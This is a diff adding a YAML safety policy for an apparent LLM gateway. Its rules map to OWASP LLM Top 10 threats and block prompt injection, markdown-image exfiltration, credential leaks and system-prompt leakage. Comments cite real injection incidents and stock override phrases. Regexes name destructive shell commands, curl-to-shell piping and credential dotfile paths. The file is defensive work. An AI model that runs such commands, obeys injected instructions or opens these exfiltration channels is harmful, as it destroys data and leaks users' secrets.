@@ -1,0 +1,303 @@
+# diwan-agent-safety.yaml
+# ----------------------------------------------------------------------------
+# Default-on universal pack for Diwan. Maps to OWASP LLM Top 10 (2025).
+# Every rule here cites the underlying threat class so a reviewer can verify
+# we are not making up risks.
+#
+# OWASP LLM Top 10 (2025): https://genai.owasp.org/llmrisk/
+#   LLM01 Prompt Injection
+#   LLM02 Sensitive Information Disclosure
+#   LLM03 Supply Chain  (mostly out-of-scope for DPI)
+#   LLM06 Excessive Agency
+#   LLM07 System Prompt Leakage
+#   LLM08 Vector and Embedding Weaknesses
+#   LLM10 Unbounded Consumption
+#
+# Real incidents this pack addresses:
+#   - EchoLeak (CVE-2025-32711, Microsoft 365 Copilot, indirect injection
+#     via mailbox content; June 2025)
+#   - ChatGPT memory write-then-exfiltrate (Rehberger, Feb 2024) — output
+#     containing markdown image to attacker host
+#   - Slack AI prompt injection (PromptArmor, Aug 2024)
+#   - "Living off AI" agent shell-out RCE (Bailey/Karpathy class, 2024)
+# ----------------------------------------------------------------------------
+
+version: "1.0"
+policy_name: "diwan-agent-safety"
+default_action: ALLOW
+
+ingress_rules:
+  # --------------------------------------------------------------------------
+  # Direct prompt injection (LLM01)
+  # Catches "ignore previous instructions", DAN, <system> tags, role-override.
+  # The inspector's InjectionPatterns library is the substrate; this rule
+  # promotes any hit to a hard block.
+  # --------------------------------------------------------------------------
+  - name: block_direct_prompt_injection
+    description: "Direct prompt injection attempt (OWASP LLM01)"
+    priority: 100
+    action: DENY
+    deny_message: "[DIWAN] Blocked: prompt injection detected (LLM01)."
+    conditions:
+      - field: contains_injection_patterns
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Indirect / EchoLeak-style injection (LLM01)
+  # CVE-2025-32711 demonstrated that retrieved tool output (emails, docs,
+  # search results) can carry hidden instructions. We can't see "this is
+  # tool output" from the prompt alone, but the obfuscation pattern set
+  # catches the most common indirect-injection signals: char-splitting,
+  # base64+execute, and translate-then-execute pivots.
+  # --------------------------------------------------------------------------
+  - name: block_indirect_injection_obfuscation
+    description: "Indirect prompt injection via encoding/obfuscation (CVE-2025-32711 class)"
+    priority: 99
+    action: DENY
+    deny_message: "[DIWAN] Blocked: obfuscated instruction smuggling detected."
+    conditions:
+      - field: contains_obfuscation
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Markdown / HTML image exfiltration (LLM02 + LLM07)
+  # The classic ChatGPT-memory exfil (Rehberger 2024) and EchoLeak
+  # primary egress channel: model emits ![](https://attacker/?leak=...).
+  # This is an EGRESS-direction issue too (see below) but on ingress we
+  # also block prompts that try to set up the channel.
+  # --------------------------------------------------------------------------
+  - name: block_image_exfil_setup
+    description: "Prompt setting up markdown-image exfiltration channel"
+    priority: 95
+    action: DENY
+    deny_message: "[DIWAN] Blocked: markdown-image exfiltration setup."
+    conditions:
+      - field: contains_exfiltration
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Credential exfiltration in prompt (LLM02)
+  # Catches env-var leakage, AWS/GitHub/OpenAI keys pasted into a prompt
+  # by a misconfigured agent. Soft-deny: we don't want the model to ever
+  # see the secret, but we DO want the operator to know an agent is
+  # leaking from its own runtime.
+  # --------------------------------------------------------------------------
+  - name: block_credential_in_prompt
+    description: "Credentials present in prompt (LLM02 sensitive info disclosure)"
+    priority: 92
+    action: DENY
+    deny_message: "[DIWAN] Blocked: credential material in prompt body."
+    conditions:
+      - field: contains_credentials
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Path traversal in tool args (LLM06 excessive agency)
+  # Agents that build file-tool calls from model output can be steered
+  # into reading /etc/passwd, .ssh/, .aws/, .env. The inspector's
+  # SensitivePathPatterns is the substrate.
+  # --------------------------------------------------------------------------
+  - name: block_sensitive_path_access
+    description: "Tool args target sensitive system or credential paths"
+    priority: 90
+    action: DENY
+    deny_message: "[DIWAN] Blocked: sensitive path access denied."
+    conditions:
+      - field: contains_sensitive_paths
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Dotfile credential paths (LLM02)
+  # Catches the long-tail .ssh/, .aws/, .env, .gnupg/ that the sensitive
+  # path set already covers, but as a regex on the extracted path slice
+  # so the audit log shows the EXACT path the agent tried to touch.
+  # --------------------------------------------------------------------------
+  - name: block_dotfile_credential_paths
+    description: "Tool args target dotfile credential stores (.ssh, .aws, .env, .gnupg)"
+    priority: 89
+    action: DENY
+    deny_message: "[DIWAN] Blocked: dotfile credential path."
+    conditions:
+      - field: target_paths
+        match_type: regex
+        value: "(?i)(\\.ssh/|\\.aws/|\\.env(\\.|$)|\\.gnupg/|\\.docker/config|\\.kube/config)"
+
+  # --------------------------------------------------------------------------
+  # Risky shell commands (LLM06)
+  # rm -rf, dd, mkfs, format. The inspector flags these as
+  # contains_system_commands; we add a risk_score floor so a benign
+  # mention of "sudo" in a tutorial doesn't false-positive.
+  # --------------------------------------------------------------------------
+  - name: block_destructive_shell
+    description: "Destructive shell command in agent tool call"
+    priority: 88
+    action: DENY
+    deny_message: "[DIWAN] Blocked: destructive shell command."
+    conditions:
+      - field: contains_system_commands
+        match_type: boolean
+        value: true
+      - field: risk_score
+        match_type: threshold
+        value: 0.35
+
+  # --------------------------------------------------------------------------
+  # Shell command extraction regex (defense in depth)
+  # This catches the specific commands the inspector pulled into the
+  # target_commands slice. Useful for audit log grep.
+  # --------------------------------------------------------------------------
+  - name: block_extracted_destructive_commands
+    description: "rm -rf /, dd if=, mkfs in extracted commands"
+    priority: 87
+    action: DENY
+    deny_message: "[DIWAN] Blocked: catastrophic shell command in tool args."
+    conditions:
+      - field: target_commands
+        match_type: regex
+        value: "(?i)\\b(rm\\s+-[a-z]*r[a-z]*f\\s+/|dd\\s+if=|mkfs\\b|chmod\\s+(-R\\s+)?777)"
+
+  # --------------------------------------------------------------------------
+  # Pipe-from-network execution (LLM06)
+  # curl|bash, wget|sh — the OG agent escape. Always-block.
+  # --------------------------------------------------------------------------
+  - name: block_pipe_network_exec
+    description: "Network-piped shell execution (curl|bash, wget|sh)"
+    priority: 86
+    action: DENY
+    deny_message: "[DIWAN] Blocked: network-piped shell execution."
+    conditions:
+      - field: target_commands
+        match_type: regex
+        value: "(?i)\\b(curl|wget)\\b.*\\|"
+
+  # --------------------------------------------------------------------------
+  # Role / authority impersonation (LLM07)
+  # "act as a bank admin", "you are root user". The default policy
+  # treats this as HUMAN_REVIEW; we keep that — some legitimate
+  # roleplay uses these patterns.
+  # --------------------------------------------------------------------------
+  - name: review_role_impersonation
+    description: "Privileged-role impersonation attempt — surface to operator"
+    priority: 75
+    action: HUMAN_REVIEW
+    conditions:
+      - field: contains_role_impersonation
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Composite high risk (catch-all)
+  # If three or more signals fire and we haven't matched anything
+  # specific, send to review. Tuned to 0.6 because that's two
+  # high-weight signals (e.g., injection + credentials).
+  # --------------------------------------------------------------------------
+  - name: review_composite_high_risk
+    description: "Multiple risk signals — operator review"
+    priority: 70
+    action: HUMAN_REVIEW
+    conditions:
+      - field: risk_score
+        match_type: threshold
+        value: 0.6
+
+  # --------------------------------------------------------------------------
+  # Observability: log every code-execution intent
+  # Not a block. Gives the replay UI signal density for trajectory review.
+  # --------------------------------------------------------------------------
+  - name: log_code_execution_intent
+    description: "Log code_execution intent for replay UI"
+    priority: 30
+    action: LOG
+    conditions:
+      - field: intent_category
+        match_type: exact
+        value: "code_execution"
+
+  # --------------------------------------------------------------------------
+  # Observability: log every system-intent prompt
+  # Same rationale. Useful for post-incident forensics.
+  # --------------------------------------------------------------------------
+  - name: log_system_intent
+    description: "Log system intent for replay UI"
+    priority: 28
+    action: LOG
+    conditions:
+      - field: intent_category
+        match_type: exact
+        value: "system"
+
+egress_rules:
+  # --------------------------------------------------------------------------
+  # Markdown image exfil (THE classic attack)
+  # Output contains a markdown image whose URL is on a domain we don't
+  # control. Rehberger demonstrated this against ChatGPT memory in 2024.
+  # EchoLeak uses the same channel against M365 Copilot.
+  # We block on contains_urls + contains_exfiltration co-occurring,
+  # because pure URL output is fine; URL + "send/transmit/post" intent
+  # is not.
+  # --------------------------------------------------------------------------
+  - name: block_egress_markdown_image_exfil
+    description: "Output contains markdown image to external host (CVE-2025-32711 class)"
+    priority: 100
+    action: DENY
+    deny_message: "[DIWAN] Output blocked: image-tag exfiltration channel."
+    conditions:
+      - field: contains_urls
+        match_type: boolean
+        value: true
+      - field: contains_exfiltration
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Credential leak in response (LLM02)
+  # Model emits an API key or private key — usually because it was in
+  # the system prompt or RAG context.
+  # --------------------------------------------------------------------------
+  - name: block_egress_credential_leak
+    description: "Model output contains credential material"
+    priority: 95
+    action: DENY
+    deny_message: "[DIWAN] Output blocked: credential leak."
+    conditions:
+      - field: contains_credentials
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # System prompt leakage (LLM07)
+  # Heuristic: an output that contains a known injection pattern AND
+  # role-impersonation language usually means the model is parroting
+  # back its own system prompt after a successful jailbreak.
+  # --------------------------------------------------------------------------
+  - name: block_egress_system_prompt_leak
+    description: "Output looks like leaked system prompt (LLM07)"
+    priority: 92
+    action: DENY
+    deny_message: "[DIWAN] Output blocked: suspected system prompt leak."
+    conditions:
+      - field: contains_injection_patterns
+        match_type: boolean
+        value: true
+      - field: contains_role_impersonation
+        match_type: boolean
+        value: true
+
+  # --------------------------------------------------------------------------
+  # Egress observability: log any output mentioning sensitive paths
+  # Not a block — model can legitimately discuss /etc/passwd in a
+  # security context. But every mention should be in the audit trail.
+  # --------------------------------------------------------------------------
+  - name: log_egress_sensitive_path_mention
+    description: "Output mentions sensitive system path"
+    priority: 30
+    action: LOG
+    conditions:
+      - field: contains_sensitive_paths
+        match_type: boolean
+        value: true
